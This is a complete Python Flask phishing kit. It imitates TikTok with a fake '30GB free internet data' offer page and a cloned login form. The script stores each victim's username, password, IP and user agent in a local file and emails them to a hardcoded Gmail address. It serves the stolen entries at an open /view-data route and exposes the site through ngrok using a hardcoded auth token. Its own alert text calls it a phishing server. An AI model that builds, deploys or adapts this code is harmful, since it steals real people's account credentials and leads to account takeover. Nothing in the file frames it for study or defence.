# =============================================================================
# TIKTOK 30GB PROMO + CLEAN LOGIN – RENDER DEPLOYMENT (EMAIL ALERTS)
# Includes /test-email endpoint for credential verification
# =============================================================================

import os
import json
import logging
import smtplib
import threading
import time
from email.message import EmailMessage
from datetime import datetime
from flask import Flask, request, render_template_string
from pyngrok import ngrok, conf

# -------------------- Configuration --------------------
NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
DATA_FILE = "captured_credentials.json"

EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# -------------------- PROMO LANDING PAGE --------------------
PROMO_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - 30GB Free Internet</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .logo { margin: 30px 0 20px; }
        .offer-card {
            background: linear-gradient(135deg, #fe2c55 0%, #ff6b6b 100%);
            border-radius: 24px;
            padding: 30px 20px;
            color: white;
            margin-bottom: 30px;
        }
        .offer-badge {
            background: rgba(255,255,255,0.2);
            display: inline-block;
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .offer-title {
            font-size: 36px;
            font-weight: 800;
            margin-bottom: 8px;
        }
        .offer-subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 24px;
        }
        .data-highlight {
            background: rgba(255,255,255,0.15);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }
        .data-number {
            font-size: 48px;
            font-weight: 800;
        }
        .data-label {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .cta-button {
            display: block;
            width: 100%;
            background: white;
            color: #fe2c55;
            border: none;
            border-radius: 50px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            text-decoration: none;
            margin: 20px 0;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }
        .cta-button:hover { transform: scale(1.02); }
        .features {
            display: flex;
            justify-content: space-around;
            margin: 30px 0;
        }
        .feature-item { text-align: center; }
        .feature-icon { font-size: 32px; margin-bottom: 8px; }
        .feature-text { font-size: 13px; color: #8a8b91; }
        .footer-note {
            color: #8a8b91;
            font-size: 12px;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #f1f1f2;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="130" height="42">
                <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
                <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
                <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
                <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
            </svg>
        </div>
        <div class="offer-card">
            <div class="offer-badge">🎁 LIMITED TIME OFFER</div>
            <div class="offer-title">30 GB</div>
            <div class="offer-subtitle">Free Internet Data</div>
            <div class="data-highlight">
                <div class="data-number">30</div>
                <div class="data-label">Gigabytes</div>
            </div>
            <p style="margin-bottom: 20px;">Exclusive for TikTok users</p>
            <a href="/login" class="cta-button">Log in with TikTok →</a>
            <p style="font-size: 12px; opacity: 0.8;">No payment required • Activate instantly</p>
        </div>
        <div class="features">
            <div class="feature-item"><div class="feature-icon">📱</div><div class="feature-text">Stream Videos</div></div>
            <div class="feature-item"><div class="feature-icon">🎮</div><div class="feature-text">Play Games</div></div>
            <div class="feature-item"><div class="feature-icon">🌐</div><div class="feature-text">Browse Free</div></div>
        </div>
        <div class="footer-note">
            <p>🔒 Secure activation through TikTok</p>
            <p style="margin-top:8px;">© 2026 TikTok</p>
        </div>
    </div>
</body>
</html>
'''

# -------------------- CLEAN LOGIN PAGE (NO PHONE) --------------------
PHISH_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok · Login</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 24px;
            background: #fff;
            border-bottom: 1px solid rgba(0,0,0,0.05);
        }
        .logo {
            display: flex;
            align-items: center;
            text-decoration: none;
            color: #000;
            font-weight: 700;
            font-size: 20px;
        }
        .logo svg { margin-right: 8px; }
        .help-link {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #606770;
            text-decoration: none;
            font-size: 14px;
        }
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .card {
            width: 100%;
            max-width: 400px;
            background: #fff;
            border-radius: 24px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.08);
            padding: 32px 28px;
        }
        .card h2 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #121212;
        }
        .subtitle {
            color: #606770;
            font-size: 15px;
            margin-bottom: 28px;
        }
        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #1f1f1f;
            margin-bottom: 6px;
        }
        .input-wrapper input {
            width: 100%;
            padding: 14px 16px;
            background: #f1f1f2;
            border: 1.5px solid transparent;
            border-radius: 14px;
            font-size: 16px;
            outline: none;
            transition: all 0.2s;
        }
        .input-wrapper input:focus {
            border-color: #fe2c55;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(254,44,85,0.1);
        }
        .forgot-link {
            text-align: right;
            margin-top: 6px;
        }
        .forgot-link a {
            color: #fe2c55;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #fe2c55;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin: 16px 0 20px;
            transition: background 0.2s, transform 0.1s;
        }
        .login-btn:hover { background: #e01e45; }
        .login-btn:active { transform: scale(0.98); }
        .signup-prompt {
            text-align: center;
            color: #606770;
            font-size: 15px;
            margin-bottom: 20px;
        }
        .signup-prompt a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
            margin-left: 6px;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 13px;
            color: #8a8b91;
        }
        .footer-links a { color: #8a8b91; text-decoration: none; }
        .copyright {
            text-align: center;
            color: #8a8b91;
            font-size: 12px;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid #f0f0f0;
        }
        .success-message {
            text-align: center;
            padding: 20px 0;
        }
        .success-message .emoji { font-size: 56px; margin-bottom: 16px; }
        .success-message h3 { font-size: 24px; margin-bottom: 8px; color: #121212; }
        .success-message p { color: #606770; margin-bottom: 24px; }
        @media (max-width: 480px) {
            .header { padding: 12px 16px; }
            .card { padding: 24px 20px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <a class="logo" href="#">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="110" height="36">
                <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
                <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
                <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
                <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
            </svg>
            <strong>TikTok</strong>
        </a>
        <a class="help-link" href="#"><svg width="18" height="18" viewBox="0 0 48 48" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"></path></svg>Help</a>
    </div>
    <div class="main">
        <div class="card">
            {% if success %}
            <div class="success-message">
                <div class="emoji">✅</div>
                <h3>Login Successful</h3>
                <p>Your 30GB data package will be activated shortly.</p>
                <p style="font-size:14px; color:#fe2c55;">Redirecting to TikTok...</p>
            </div>
            <script>setTimeout(()=>{ window.location.href='https://www.tiktok.com'; },2500);</script>
            {% else %}
            <h2>Log in to TikTok</h2>
            <div class="subtitle">Claim your 30GB free data offer</div>
            <form method="POST">
                <div class="form-group">
                    <label>Email or username</label>
                    <div class="input-wrapper"><input type="text" name="identifier" placeholder="Enter your email or username" autocomplete="username" required autofocus></div>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <div class="input-wrapper"><input type="password" name="password" placeholder="••••••••" autocomplete="current-password" required></div>
                    <div class="forgot-link"><a href="#">Forgot password?</a></div>
                </div>
                <button type="submit" class="login-btn">Log in & Claim Offer</button>
            </form>
            <div class="signup-prompt">Don't have an account?<a href="#">Sign up</a></div>
            <div class="footer-links"><a href="#">About</a><a href="#">Newsroom</a><a href="#">Contact</a><a href="#">Careers</a></div>
            <div class="copyright">© 2026 TikTok</div>
            {% endif %}
        </div>
    </div>
</body>
</html>
'''

# -------------------- Email Functions --------------------
def send_email_alert(identifier, password, ip, user_agent, timestamp):
    """Send captured credentials via Gmail SMTP."""
    if not EMAIL_SENDER or not EMAIL_PASSWORD:
        logger.error("❌ Email credentials not set in environment variables!")
        return False

    subject = f"🎉 TikTok Capture: {identifier}"
    body = f"""New TikTok login captured!

📧 Identifier: {identifier}
🔐 Password: {password}
🌐 IP Address: {ip}
🕒 Timestamp: {timestamp}
📱 User Agent: {user_agent}

---
This is an automated alert from your TikTok phishing server.
"""
    msg = EmailMessage()
    msg.set_content(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
        logger.info(f"✅ Email alert sent to {EMAIL_RECEIVER}")
        return True
    except smtplib.SMTPAuthenticationError as e:
        logger.error(f"❌ Gmail authentication failed. Check EMAIL_SENDER and App Password. Error: {e}")
        return False
    except Exception as e:
        logger.error(f"❌ Failed to send email: {e}")
        return False

def save_credential(creds):
    try:
        with open(DATA_FILE, 'a') as f:
            json.dump(creds, f)
            f.write('\n')
    except Exception as e:
        logger.error(f"Failed to save credentials: {e}")

# -------------------- Routes --------------------
@app.route('/')
def promo():
    return render_template_string(PROMO_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        identifier = request.form.get('identifier', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.utcnow().isoformat()

        creds = {
            'identifier': identifier,
            'password': password,
            'ip': ip,
            'timestamp': timestamp,
            'user_agent': user_agent
        }

        save_credential(creds)
        send_email_alert(identifier, password, ip, user_agent, timestamp)

        logger.info(f"🎉 Capture! Identifier: {identifier} | Password: {password} | IP: {ip}")

        return render_template_string(PHISH_HTML, success=True)

    return render_template_string(PHISH_HTML, success=False)

@app.route('/view-data')
def view_data():
    try:
        with open(DATA_FILE, 'r') as f:
            lines = f.readlines()
        data = [json.loads(line) for line in lines if line.strip()]
        return {'count': len(data), 'entries': data}
    except FileNotFoundError:
        return {'count': 0, 'entries': []}

@app.route('/test-email')
def test_email():
    """Test endpoint to verify email configuration."""
    if not EMAIL_SENDER or not EMAIL_PASSWORD:
        return "❌ EMAIL_SENDER or EMAIL_PASSWORD environment variables are missing.", 500

    success = send_email_alert(
        identifier="test@example.com",
        password="TestPassword123",
        ip="127.0.0.1",
        user_agent="TestAgent",
        timestamp=datetime.utcnow().isoformat()
    )
    if success:
        return f"✅ Test email sent successfully to {EMAIL_RECEIVER}. Check inbox/spam."
    else:
        return "❌ Failed to send test email. Check Render logs for details.", 500

# -------------------- Start ngrok --------------------
def start_ngrok():
    time.sleep(3)
    try:
        conf.get_default().auth_token = NGROK_AUTH_TOKEN
        tunnel = ngrok.connect(5000, bind_tls=True)
        public_url = tunnel.public_url
        logger.info(f"✅ ngrok tunnel established: {public_url}")
    except Exception as e:
        logger.error(f"⚠️ ngrok failed to start: {e}")

if __name__ == '__main__':
    threading.Thread(target=start_ngrok, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
